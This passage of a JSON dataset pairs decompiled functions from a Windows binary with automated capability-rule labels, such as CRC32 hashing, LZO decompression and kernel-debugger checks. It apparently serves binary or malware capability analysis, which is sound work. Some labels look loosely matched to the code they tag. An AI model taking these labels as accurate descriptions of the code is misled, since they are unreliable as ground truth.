  *arg_20h = iVar3 + -0xa96c7 + dVar2;\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 567
    },
    "00419e40": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nuint fcn.00419e40(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    uint *puVar4;\n    uint uVar5;\n    uint uVar6;\n    uint32_t uVar7;\n    uint32_t unaff_EBX;\n    uint32_t unaff_EBP;\n    uint32_t unaff_ESI;\n    uint32_t unaff_EDI;\n    uint *puVar8;\n    uint32_t uStack4;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_FindResourceA)(param_1, param_2);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    uVar2 = (*_sym.imp.KERNEL32.dll_SizeofResource)(param_1, iVar1);\n    puVar3 = (*_sym.imp.KERNEL32.dll_LoadResource)(param_1, iVar1);\n    if (puVar3 == NULL) {\n        return 0;\n    }\n    puVar4 = (*_sym.imp.KERNEL32.dll_GlobalAlloc)(0x40, uVar2);\n    if (puVar4 == NULL) {\n        return 0;\n    }\n    puVar8 = puVar4;\n    for (uVar7 = uVar2 >> 2; uVar7 != 0; uVar7 = uVar7 - 1) {\n        *puVar8 = *puVar3;\n        puVar3 = puVar3 + 1;\n        puVar8 = puVar8 + 1;\n    }\n    for (uVar2 = uVar2 & 3; uVar2 != 0; uVar2 = uVar2 - 1) {\n        *puVar8 = *puVar3;\n        puVar3 = puVar3 + 1;\n        puVar8 = puVar8 + 1;\n    }\n    puVar4[10] = 0x20000;\n    puVar4[0x11] = (unaff_EDI >> 8 & 0xff) << 8 | unaff_EDI >> 0x10 & 0xff | (unaff_EDI & 0xff) << 0x10;\n    puVar4[0x12] = (unaff_EBP >> 8 & 0xff) << 8 | unaff_EBP >> 0x10 & 0xff | (unaff_EBP & 0xff) << 0x10;\n    puVar4[0x19] = (unaff_ESI >> 8 & 0xff) << 8 | (unaff_ESI & 0xff) << 0x10 | unaff_ESI >> 0x10 & 0xff;\n    puVar4[0x15] = (unaff_EBX >> 8 & 0xff) << 8 | (unaff_EBX & 0xff) << 0x10 | unaff_EBX >> 0x10 & 0xff;\n    puVar4[0x14] = (uStack4 >> 8 & 0xff) << 8 | (uStack4 & 0xff) << 0x10 | uStack4 >> 0x10 & 0xff;\n    uVar5 = (*_sym.imp.USER32.dll_GetDC)(0);\n    uVar6 = (*_sym.imp.GDI32.dll_CreateDIBitmap)(uVar5, puVar4, 4, puVar4 + 0x1a, puVar4, 0);\n    (*_sym.imp.USER32.dll_ReleaseDC)(0, uVar5);\n    (*_sym.imp.KERNEL32.dll_GlobalFree)(puVar4);\n    return uVar6;\n}\n",
        "token_count": 815
    },
    "null": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "00405d33": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405d33(int32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    \n    if (((*(in_ECX + 0x71) & 0x10) != 0) && ((*(in_ECX + 0x6c) & 1) != arg_8h)) {\n        arg_8h = NULL;\n        *(in_ECX + 0x6c) = *(in_ECX + 0x6c) ^ 1;\n        iVar1 = (****(in_ECX + 0x4c))(*(in_ECX + 0x4c), 0x42c498, &arg_8h);\n        if (-1 < iVar1) {\n            (**(*arg_8h + 0x14))(arg_8h, 0xfffffd37);\n            (**(*arg_8h + 8))(arg_8h);\n        }\n    }\n    return;\n}\n",
        "token_count": 218
    },
    "00409fe0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.00409fe0(int32_t noname_0, int32_t noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, \n            uint noname_6, uint noname_7, uint hWnd)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint unaff_EBX;\n    int32_t unaff_ESI;\n    uint noname_3_00;\n    uint noname_4_00;\n    uint in_stack_ffffffe0;\n    uint in_stack_ffffffe4;\n    uint32_t noname_2_00;\n    \n    pcVar1 = _sym.imp.USER32.dll_GetWindow;\n    if (noname_1 == 0) {\ncode_r0x0040a08f:\n        noname_2_00 = 0x40a098;\n        uVar2 = (*_sym.imp.USER32.dll_GetTopWindow)(*(noname_0 + 0x1c));\n        iVar3 = fcn.0041db42();\n        if (iVar3 == 0) {\n            return noname_0;\n        }\n    }\n    else {\n        noname_2_00 = *(noname_1 + 0x1c);\n        uVar2 = (*_sym.imp.USER32.dll_GetWindow)(noname_2_00, 2);\n        noname_0 = unaff_ESI;\n        iVar3 = fcn.0041db42(uVar2);\n        while (iVar3 == 0) {\n            in_stack_ffffffe4 = *(noname_1 + 0x1c);\n            in_stack_ffffffe0 = 0x40a014;\n            uVar2 = (*_sym.imp.USER32.dll_GetParent)();\n            uVar2 = fcn.0041db42(uVar2);\n            noname_1 = fcn.00409f87(noname_0, uVar2);\n            if ((noname_1 == 0) || (noname_1 == noname_0)) goto code_r0x0040a08f;\n            noname_2_00 = *(noname_1 + 0x1c);\n            uVar2 = (*pcVar1)(noname_2_00, 2);\n            iVar3 = fcn.0041db42(uVar2);\n        }\n        in_stack_ffffffe0 = *(noname_1 + 0x1c);\n        in_stack_ffffffe4 = 2;\n        uVar2 = (*pcVar1)();\n        iVar3 = fcn.0041db42();\n    }\n    noname_4_00 = 0xffffffec;\n    noname_3_00 = *(iVar3 + 0x1c);\n    uVar4 = (*_sym.imp.USER32.dll_GetWindowLongA)();\n    if ((uVar4 & 0x10000) != 0) {\n        if ((((noname_2_00 & 1) == 0) || (iVar5 = (*_sym.imp.USER32.dll_IsWindowVisible)(*(iVar3 + 0x1c)),  iVar5 != 0))\n           && (((noname_2_00 & 2) == 0 || (iVar5 = fcn.00420478(),  iVar5 != 0)))) {\n            noname_0 = iVar3;\n            iVar3 = 0;\n        }\n        iVar3 = fcn.00409fe0(noname_0, iVar3, noname_2_00, noname_3_00, noname_4_00, unaff_EBX, uVar2, in_stack_ffffffe0\n                             , in_stack_ffffffe4);\n    }\n    return iVar3;\n}\n",
        "token_count": 843
    },
    "0040a36f": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint32_t fcn.0040a36f(uint32_t param_1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    if (param_1 == 0) {\n        return param_1;\n    }\n    iVar1 = *(param_1 + 0x38);\n    if (iVar1 != 0) {\n        if ((*(iVar1 + 0x71) & 0x10) != 0) {\n            return (-((*(iVar1 + 0x6c) & 1) != 0) & 0xfffffff0) + 0x20;\n        }\n        return 0;\n    }\n    uVar2 = fcn.00409f2b(param_1, 0);\n    return uVar2 & 0x30;\n}\n",
        "token_count": 178
    },
    "0040d2e9": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040d2e9(uint32_t *arg_8h, uint32_t arg_ch)\n\n{\n    char *pcVar1;\n    uint32_t *puVar2;\n    int32_t *piVar3;\n    char cVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    code *pcVar8;\n    uint8_t uVar9;\n    int32_t *piVar10;\n    uint32_t uVar11;\n    uint32_t uVar12;\n    uint32_t uVar13;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar5 = arg_8h[4];\n    iVar6 = *(arg_ch - 4);\n    piVar10 = arg_ch - 4;\n    uVar11 = arg_ch - arg_8h[3] >> 0xf;\n    uVar7 = *(arg_ch - 8);\n    var_ch = iVar6 + -1;\n    piVar3 = uVar11 * 0x204 + 0x144 + uVar5;\n    uVar13 = *(var_ch + piVar10);\n    if ((uVar13 & 1) == 0) {\n        arg_ch = (uVar13 >> 4) - 1;\n        if (0x3f < arg_ch) {\n            arg_ch = 0x3f;\n        }\n        if (*(iVar6 + 3 + piVar10) == *(iVar6 + 7 + piVar10)) {\n            if (arg_ch < 0x20) {\n                pcVar1 = arg_ch + 4 + uVar5;\n                uVar12 = ~(0x80000000U >> (arg_ch & 0x1f));\n                puVar2 = uVar5 + 0x44 + uVar11 * 4;\n                *puVar2 = *puVar2 & uVar12;\n                *pcVar1 = *pcVar1 + -1;\n                if (*pcVar1 == '\\0') {\n                    *arg_8h = *arg_8h & uVar12;\n                }\n            }\n            else {\n                pcVar1 = arg_ch + 4 + uVar5;\n                uVar12 = ~(0x80000000U >> (arg_ch - 0x20 & 0x1f));\n                puVar2 = uVar5 + 0xc4 + uVar11 * 4;\n                *puVar2 = *puVar2 & uVar12;\n                *pcVar1 = *pcVar1 + -1;\n                if (*pcVar1 == '\\0') {\n                    arg_8h[1] = arg_8h[1] & uVar12;\n                }\n            }\n        }\n        *(*(iVar6 + 7 + piVar10) + 4) = *(iVar6 + 3 + piVar10);\n        var_ch = var_ch + uVar13;\n        *(*(iVar6 + 3 + piVar10) + 8) = *(iVar6 + 7 + piVar10);\n    }\n    uVar13 = (var_ch >> 4) - 1;\n    if (0x3f < uVar13) {\n        uVar13 = 0x3f;\n    }\n    if ((uVar7 & 1) == 0) {\n        piVar10 = piVar10 - uVar7;\n        arg_ch = (uVar7 >> 4) - 1;\n        if (0x3f < arg_ch) {\n            arg_ch = 0x3f;\n        }\n        var_ch = var_ch + uVar7;\n        uVar13 = (var_ch >> 4) - 1;\n        if (0x3f < uVar13) {\n            uVar13 = 0x3f;\n        }\n        if (arg_ch != uVar13) {\n            if (piVar10[1] == piVar10[2]) {\n                if (arg_ch < 0x20) {\n                    pcVar1 = arg_ch + 4 + uVar5;\n                    uVar12 = ~(0x80000000U >> (arg_ch & 0x1f));\n                    puVar2 = uVar5 + 0x44 + uVar11 * 4;\n                    *puVar2 = *puVar2 & uVar12;\n                    *pcVar1 = *pcVar1 + -1;\n                    if (*pcVar1 == '\\0') {\n                        *arg_8h = *arg_8h & uVar12;\n                    }\n                }\n                else {\n                    pcVar1 = arg_ch + 4 + uVar5;\n                    uVar12 = ~(0x80000000U >> (arg_ch - 0x20 & 0x1f));\n                    puVar2 = uVar5 + 0xc4 + uVar11 * 4;\n                    *puVar2 = *puVar2 & uVar12;\n                    *pcVar1 = *pcVar1 + -1;\n                    if (*pcVar1 == '\\0') {\n                        arg_8h[1] = arg_8h[1] & uVar12;\n                    }\n                }\n            }\n            *(piVar10[2] + 4) = piVar10[1];\n            *(piVar10[1] + 8) = piVar10[2];\n        }\n    }\n    if (((uVar7 & 1) != 0) || (arg_ch != uVar13)) {\n        piVar10[1] = piVar3[uVar13 * 2 + 1];\n        piVar10[2] = piVar3 + uVar13 * 2;\n        (piVar3 + uVar13 * 2)[1] = piVar10;\n        *(piVar10[1] + 8) = piVar10;\n        if (piVar10[1] == piVar10[2]) {\n            cVar4 = *(uVar13 + 4 + uVar5);\n            *(uVar13 + 4 + uVar5) = cVar4 + '\\x01';\n            uVar9 = uVar13;\n            if (uVar13 < 0x20) {\n                if (cVar4 == '\\0') {\n                    *arg_8h = *arg_8h | 0x80000000U >> (uVar9 & 0x1f);\n                }\n                puVar2 = uVar5 + 0x44 + uVar11 * 4;\n                *puVar2 = *puVar2 | 0x80000000U >> (uVar9 & 0x1f);\n            }\n            else {\n                if (cVar4 == '\\0') {\n                    arg_8h[1] = arg_8h[1] | 0x80000000U >> (uVar9 - 0x20 & 0x1f);\n                }\n                puVar2 = uVar5 + 0xc4 + uVar11 * 4;\n                *puVar2 = *puVar2 | 0x80000000U >> (uVar9 - 0x20 & 0x1f);\n            }\n        }\n    }\n    *piVar10 = var_ch;\n    *(var_ch + -4 + piVar10) = var_ch;\n    *piVar3 = *piVar3 + -1;\n    pcVar8 = _sym.imp.KERNEL32.dll_VirtualFree;\n    uVar5 = *0x44f148;\n    puVar2 = *0x44f150;\n    if ((*piVar3 == 0) && (uVar5 = uVar11,  puVar2 = arg_8h,  *0x44f150 != NULL)) {\n        (*_sym.imp.KERNEL32.dll_VirtualFree)(*0x44f148 * 0x8000 + (*0x44f150)[3], 0x8000, 0x4000);\n        (*0x44f150)[2] = (*0x44f150)[2] | 0x80000000U >> (*0x44f148 & 0x1f);\n        *((*0x44f150)[4] + 0xc4 + *0x44f148 * 4) = 0;\n        *((*0x44f150)[4] + 0x43) = *((*0x44f150)[4] + 0x43) + -1;\n        if (*((*0x44f150)[4] + 0x43) == '\\0') {\n            (*0x44f150)[1] = (*0x44f150)[1] & 0xfffffffe;\n        }\n        puVar2 = arg_8h;\n        if ((*0x44f150)[2] == 0xffffffff) {\n            (*pcVar8)((*0x44f150)[3], 0, 0x8000);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(*0x44f15c, 0, (*0x44f150)[4]);\n            fcn.0040b2d0(*0x44f150, *0x44f150 + 5, (*0x44f154 * 0x14 - *0x44f150) + -0x14 + *0x44f158);\n            *0x44f154 = *0x44f154 + -1;\n            if (*0x44f150 < arg_8h) {\n                arg_8h = arg_8h + -5;\n            }\n            *0x44f14c = *0x44f158;\n            puVar2 = arg_8h;\n        }\n    }\n    *0x44f150 = puVar2;\n    *0x44f148 = uVar5;\n    return;\n}\n",
        "token_count": 2169
    },
    "0040fa4f": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.0040fa4f(uint arg_8h, uint8_t *arg_ch, uint *arg_10h)\n\n{\n    int16_t iVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    uint *puVar4;\n    uint arg_ch_00;\n    int16_t *piVar5;\n    int32_t *piVar6;\n    int32_t iVar7;\n    uint8_t uVar8;\n    int32_t iVar9;\n    uint32_t uVar10;\n    uint64_t uVar11;\n    uint64_t uVar12;\n    uint var_248h;\n    uint var_49h;\n    uint var_44h;\n    int32_t var_40h;\n    int32_t var_3ch;\n    uint var_38h;\n    uint var_34h;\n    int32_t var_30h;\n    int32_t var_2ch;\n    int32_t var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    uchar var_16h;\n    char var_15h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint32_t var_ch;\n    uint *var_8h;\n    uint32_t var_4h;\n    \n    var_30h = 0;\n    uVar8 = *arg_ch;\n    arg_ch = arg_ch + 1;\n    var_ch = 0;\n    var_14h = 0;\n    do {\n        if ((uVar8 == 0) || (var_14h < 0)) {\n            return var_14h;\n        }\n        if ((uVar8 < ' ') || ('x' < uVar8)) {\n            uVar2 = 0;\n        }\n        else {\n            uVar2 = *(uVar8 + 0x42c060) & 0xf;\n        }\n        var_30h = *(var_30h + 0x42c080 + uVar2 * 8) >> 4;\n    // switch table (8 cases) at 0x410170\n        switch(var_30h) {\n        case 0:\ncode_r0x0040fbee:\n            var_24h = 0;\n            if ((*(*0x44a760 + 1 + uVar8 * 2) & 0x80) != 0) {\n                fcn.00410190(uVar8, arg_8h, &var_14h);\n                uVar8 = *arg_ch;\n                arg_ch = arg_ch + 1;\n            }\n            fcn.00410190(uVar8, arg_8h, &var_14h);\n            break;\n        case 1:\n            var_10h = -1;\n            var_34h = 0;\n            var_28h = 0;\n            var_20h = 0;\n            var_1ch = 0;\n            var_4h = 0;\n            var_24h = 0;\n            break;\n        case 2:\n            if (uVar8 == 0x20) {\n                var_4h = var_4h | 2;\n            }\n            else if (uVar8 == 0x23) {\n                var_4h = var_4h | 0x80;\n            }\n            else if (uVar8 == 0x2b) {\n                var_4h = var_4h | 1;\n            }\n            else if (uVar8 == 0x2d) {\n                var_4h = var_4h | 4;\n            }\n            else if (uVar8 == 0x30) {\n                var_4h = var_4h | 8;\n            }\n            break;\n        case 3:\n            if (uVar8 == 0x2a) {\n                var_20h = fcn.0041022e(&arg_10h);\n                if (var_20h < 0) {\n                    var_4h = var_4h | 4;\n                    var_20h = -var_20h;\n                }\n            }\n            else {\n                var_20h = uVar8 + -0x30 + var_20h * 10;\n            }\n            break;\n        case 4:\n            var_10h = 0;\n            break;\n        case 5:\n            if (uVar8 == 0x2a) {\n                var_10h = fcn.0041022e(&arg_10h);\n                if (var_10h < 0) {\n                    var_10h = -1;\n                }\n            }\n            else {\n                var_10h = uVar8 + -0x30 + var_10h * 10;\n            }\n            break;\n        case 6:\n            if (uVar8 == 0x49) {\n                if ((*arg_ch != 0x36) || (arg_ch[1] != 0x34)) {\n                    var_30h = 0;\n                    goto code_r0x0040fbee;\n                }\n                arg_ch = arg_ch + 2;\n                var_4h = var_4h | 0x8000;\n            }\n            else if (uVar8 == 0x68) {\n                var_4h = var_4h | 0x20;\n            }\n            else if (uVar8 == 0x6c) {\n                var_4h = var_4h | 0x10;\n            }\n            else if (uVar8 == 0x77) {\n                var_4h = var_4h | 0x800;\n            }\n            break;\n        case 7:\n            puVar4 = var_8h;\n            if (uVar8 < 'h') {\n                if (uVar8 < 'e') {\n                    if (uVar8 < 'Y') {\n                        if (uVar8 == 0x58) {\ncode_r0x0040fece:\n                            var_2ch = 7;\ncode_r0x0040fed5:\n                            var_ch = 0x10;\n                            if ((var_4h & 0x80) != 0) {\n                                var_16h = 0x30;\n                                var_15h = var_2ch + 'Q';\n                                var_1ch = 2;\n                            }\n                            goto code_r0x0040ff3f;\n                        }\n                        if (uVar8 != 0x43) {\n                            if ((uVar8 != 0x45) && (uVar8 != 0x47)) {\n                                if (uVar8 == 0x53) {\n                                    if ((var_4h & 0x830) == 0) {\n                                        var_4h = var_4h | 0x800;\n                                    }\n                                    goto code_r0x0040fc7c;\n                                }\n                                goto code_r0x00410059;\n                            }\n                            var_34h = 1;\n                            uVar8 = uVar8 + 0x20;\n                            goto code_r0x0040fcdd;\n                        }\n                        if ((var_4h & 0x830) == 0) {\n                            var_4h = var_4h | 0x800;\n                        }\ncode_r0x0040fd0a:\n                        if ((var_4h & 0x810) == 0) {\n                            var_248h._0_1_ = fcn.0041022e(&arg_10h);\n                            var_ch = 1;\n                        }\n                        else {\n                            arg_ch_00 = fcn.0041024b();\n                            var_ch = fcn.00411933(&var_248h, arg_ch_00);\n                            if (var_ch < 0) {\n                                var_28h = 1;\n                            }\n                        }\n                        puVar4 = &var_248h;\n                    }\n                    else if (uVar8 == 0x5a) {\n                        piVar5 = fcn.0041022e(&arg_10h);\n                        if ((piVar5 == NULL) || (puVar4 = *(piVar5 + 2),  puVar4 == NULL)) {\n                            var_8h = *0x44a750;\n                            puVar4 = *0x44a750;\n                            goto code_r0x0040fe4f;\n                        }\n                        if ((var_4h & 0x800) == 0) {\n                            var_24h = 0;\n                            var_ch = *piVar5;\n                        }\n                        else {\n                            var_ch = *piVar5 >> 1;\n                            var_24h = 1;\n                        }\n                    }\n                    else {\n                        if (uVar8 == 99) goto code_r0x0040fd0a;\n                        if (uVar8 == 100) goto code_r0x0040ff34;\n                    }\n                }\n                else {\ncode_r0x0040fcdd:\n                    var_4h = var_4h | 0x40;\n                    puVar4 = &var_248h;\n                    if (var_10h < 0) {\n                        var_10h = 6;\n                    }\n                    else if ((var_10h == 0) && (uVar8 == 0x67)) {\n                        var_10h = 1;\n                    }\n                    unique0x00007a00 = *arg_10h;\n                    var_44h = arg_10h[1];\n                    arg_10h = arg_10h + 2;\n                    var_8h = puVar4;\n                    (**0x44a980)(&var_49h + 1, &var_248h, uVar8, var_10h, var_34h);\n                    uVar2 = var_4h & 0x80;\n                    if ((uVar2 != 0) && (var_10h == 0)) {\n                        (**0x44a98c)(&var_248h);\n                    }\n                    if ((uVar8 == 0x67) && (uVar2 == 0)) {\n                        (**0x44a984)(&var_248h);\n                    }\n                    if (var_248h == '-') {\n                        var_4h = var_4h | 0x100;\n                        puVar4 = &var_248h + 1;\n                        var_8h = puVar4;\n                    }\ncode_r0x0040fe4f:\n                    var_ch = fcn.0040f370(puVar4);\n                    puVar4 = var_8h;\n                }\n            }\n            else {\n                if (uVar8 == 0x69) {\ncode_r0x0040ff34:\n                    var_4h = var_4h | 0x40;\n                }\n                else {\n                    if (uVar8 == 0x6e) {\n                        piVar6 = fcn.0041022e(&arg_10h);\n                        if ((var_4h & 0x20) == 0) {\n                            *piVar6 = var_14h;\n                        }\n                        else {\n                            *piVar6 = var_14h;\n                        }\n                        var_28h = 1;\n                        break;\n                    }\n                    if (uVar8 == 0x6f) {\n                        var_ch = 8;\n                        if ((var_4h & 0x80) != 0) {\n                            var_4h = var_4h | 0x200;\n                        }\n                        goto code_r0x0040ff3f;\n                    }\n                    if (uVar8 == 0x70) {\n                        var_10h = 8;\n                        goto code_r0x0040fece;\n                    }\n                    if (uVar8 == 0x73) {\ncode_r0x0040fc7c:\n                        iVar9 = var_10h;\n                        if (var_10h == -1) {\n                            iVar9 = 0x7fffffff;\n                        }\n                        puVar3 = fcn.0041022e(&arg_10h);\n                        if ((var_4h & 0x810) == 0) {\n                            puVar4 = puVar3;\n                            if (puVar3 == NULL) {\n                                puVar3 = *0x44a750;\n                                puVar4 = *0x44a750;\n                            }\n                            for (; (iVar9 != 0 && (*puVar3 != '\\0')); puVar3 = puVar3 + 1) {\n                                iVar9 = iVar9 + -1;\n                            }\n                            var_ch = puVar3 - puVar4;\n                        }\n                        else {\n                            if (puVar3 == NULL) {\n                                puVar3 = *0x44a754;\n                            }\n                            var_24h = 1;\n                            for (puVar4 = puVar3; (iVar9 != 0 && (*puVar4 != 0)); puVar4 = puVar4 + 2) {\n                                iVar9 = iVar9 + -1;\n                            }\n                            var_ch = puVar4 - puVar3 >> 1;\n                            puVar4 = puVar3;\n                        }\n                        goto code_r0x00410059;\n                    }\n                    if (uVar8 != 0x75) {\n                        if (uVar8 != 0x78) goto code_r0x00410059;\n                        var_2ch = 0x27;\n                        goto code_r0x0040fed5;\n                    }\n                }\n                var_ch = 10;\ncode_r0x0040ff3f:\n                if ((var_4h & 0x8000) == 0) {\n                    if ((var_4h & 0x20) == 0) {\n                        if ((var_4h & 0x40) == 0) {\n                            uVar2 = fcn.0041022e(&arg_10h);\n                            uVar11 = uVar2;\n                            goto code_r0x0040ff92;\n                        }\n                        uVar2 = fcn.0041022e(&arg_10h);\n                    }\n                    else if ((var_4h & 0x40) == 0) {\n                        uVar2 = fcn.0041022e(&arg_10h);\n                        uVar2 = uVar2 & 0xffff;\n                    }\n                    else {\n                        iVar1 = fcn.0041022e(&arg_10h);\n                        uVar2 = iVar1;\n                    }\n                    uVar11 = uVar2;\n                }\n                else {\n                    uVar11 = fcn.0041023b(&arg_10h);\n                }\ncode_r0x0040ff92:\n                if ((((var_4h & 0x40) != 0) && (uVar11 < 0x100000000)) && (uVar11 < 0)) {\n                    uVar11 = CONCAT44(-((uVar11 >> 0x20) + (uVar11 != 0)), -uVar11);\n                    var_4h = var_4h | 0x100;\n                }\n                uVar2 = uVar11 >> 0x20;\n                if ((var_4h & 0x8000) == 0) {\n                    uVar2 = 0;\n                }\n                uVar12 = uVar11 & 0xffffffff | uVar2 << 0x20;\n                if (var_10h < 0) {\n                    var_10h = 1;\n                }\n                else {\n                    var_4h = var_4h & 0xfffffff7;\n                }\n                if ((uVar11 | uVar2) == 0) {\n                    var_1ch = 0;\n                }\n                var_8h = &var_49h;\n                while ((iVar9 = var_10h + -1,  0 < var_10h || (uVar12 != 0))) {\n                    var_3ch = var_ch >> 0x1f;\n                    var_40h = var_ch;\n                    var_10h = iVar9;\n                    iVar9 = fcn.004106b0(uVar12, var_ch, var_3ch);\n                    iVar9 = iVar9 + 0x30;\n                    uVar12 = fcn.00410640();\n                    if (0x39 < iVar9) {\n                        iVar9 = iVar9 + var_2ch;\n                    }\n                    puVar4 = var_8h + -1;\n                    *var_8h = iVar9;\n                    var_8h = puVar4;\n                }\n                var_ch = &var_49h + -var_8h;\n                puVar4 = var_8h + 1;\n                var_10h = iVar9;\n                if (((var_4h & 0x200) != 0) && ((*puVar4 != '0' || (var_ch == 0)))) {\n                    var_ch = &var_49h + -var_8h + 1;\n                    *var_8h = '0';\n                    puVar4 = var_8h;\n                }\n            }\ncode_r0x00410059:\n            var_8h = puVar4;\n            uVar2 = var_4h;\n            if (var_28h == 0) {\n                if ((var_4h & 0x40) != 0) {\n                    if ((var_4h & 0x100) == 0) {\n                        if ((var_4h & 1) == 0) {\n                            if ((var_4h & 2) == 0) goto code_r0x00410091;\n                            var_16h = 0x20;\n                        }\n                        else {\n                            var_16h = 0x2b;\n                        }\n                    }\n                    else {\n                        var_16h = 0x2d;\n                    }\n                    var_1ch = 1;\n                }\ncode_r0x00410091:\n                iVar9 = (var_20h - var_1ch) - var_ch;\n                if ((var_4h & 0xc) == 0) {\n                    fcn.004101c5(0x20, iVar9, arg_8h, &var_14h);\n                }\n                fcn.004101f6(&var_16h, var_1ch, arg_8h, &var_14h);\n                if (((uVar2 & 8) != 0) && ((uVar2 & 4) == 0)) {\n                    fcn.004101c5(0x30, iVar9, arg_8h, &var_14h);\n                }\n                if ((var_24h == 0) || (uVar2 = var_ch,  puVar4 = var_8h,  var_ch < 1)) {\n                    fcn.004101f6(var_8h, var_ch, arg_8h, &var_14h);\n                }\n                else {\n                    do {\n                        uVar10 = uVar2 - 1;\n                        iVar7 = fcn.00411933(&var_38h, uVar2 & 0xffff0000 | *puVar4);\n                        if (iVar7 < 1) break;\n                        fcn.004101f6(&var_38h, iVar7, arg_8h, &var_14h);\n                        uVar2 = uVar10;\n                        puVar4 = puVar4 + 2;\n                    } while (uVar10 != 0);\n                }\n                if ((var_4h & 4) != 0) {\n                    fcn.004101c5(0x20, iVar9, arg_8h, &var_14h);\n                }\n            }\n        }\n        uVar8 = *arg_ch;\n        arg_ch = arg_ch + 1;\n    } while( true );\n}\n",
        "token_count": 4341
    },
    "00416bd0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid fcn.00416bd0(uint param_1, uint16_t param_2, uint32_t param_3)\n\n{\n    uint uVar1;\n    \n    uVar1 = (*_sym.imp.GDI32.dll_SetBkColor)(param_1, *((param_3 & 0xffff) * 4 + 0x44f404));\n    if ((param_3 & 2) != 0) {\n        (*_sym.imp.GDI32.dll_ExtTextOutA)(param_1, 0, 0, 2, &stack0xffffffe8, 0, 0, 0);\n    }\n    if ((param_3 & 1) != 0) {\n        (*_sym.imp.GDI32.dll_ExtTextOutA)(param_1, 0, 0, 2, &stack0xffffffe8, 0, 0, 0);\n    }\n    if (param_1 != param_2) {\n        (*_sym.imp.GDI32.dll_SetBkColor)(param_1, *(param_2 * 4 + 0x44f404));\n    }\n    if ((param_3 & 4) != 0) {\n        (*_sym.imp.GDI32.dll_ExtTextOutA)(param_1, 0, 0, 2, &stack0xffffffe8, 0, 0, 0);\n    }\n    if ((param_3 & 8) != 0) {\n        (*_sym.imp.GDI32.dll_ExtTextOutA)(param_1, 0, 0, 2, &stack0xffffffe8, 0, 0, 0);\n    }\n    (*_sym.imp.GDI32.dll_SetBkColor)(param_1, uVar1);\n    return;\n}\n",
        "token_count": 395
    },
    "00418590": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid fcn.00418590(uint param_1)\n\n{\n    uint32_t uVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    uchar *puStack64;\n    uint uStack60;\n    uchar *puStack56;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uchar auStack16 [8];\n    int32_t iStack8;\n    \n    puStack32 = &stack0xfffffff0;\n    uStack36 = param_1;\n    uStack40 = 0x4185a6;\n    (*_sym.imp.USER32.dll_GetWindowRect)();\n    uStack40 = 0xfffffff0;\n    uStack44 = param_1;\n    uStack48 = 0x4185af;\n    uVar3 = (*_sym.imp.USER32.dll_GetWindowLongA)();\n    if (((uVar3 & 0x10000000) != 0) &&\n       ((((iStack8 == 0 || (uVar1 = *(iStack8 + 0x18),  (uVar1 & 0xc0) != 0)) || ((uVar1 & 2) == 0)) ||\n        ((uVar1 & 1) == 0)))) {\n        puStack56 = &stack0xffffffe0;\n        uStack48 = 1;\n        uStack52 = 1;\n        uStack60 = 0x41860e;\n        (*_sym.imp.USER32.dll_InflateRect)();\n        uStack60 = param_1;\n        puStack64 = 0x418615;\n        uVar4 = (*_sym.imp.USER32.dll_GetParent)();\n        pcVar2 = _sym.imp.USER32.dll_ScreenToClient;\n        puStack64 = &stack0xffffffd0;\n        (*_sym.imp.USER32.dll_ScreenToClient)(uVar4);\n        (*pcVar2)(uVar4, &stack0xffffffd0);\n        if ((uVar3 & 0x200000) != 0) {\n            puStack56 = puStack56 + 1;\n        }\n        (*_sym.imp.USER32.dll_InvalidateRect)(uVar4, &stack0xffffffc0, 0);\n    }\n    return;\n}\n",
        "token_count": 511
    },
    "0041cc46": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
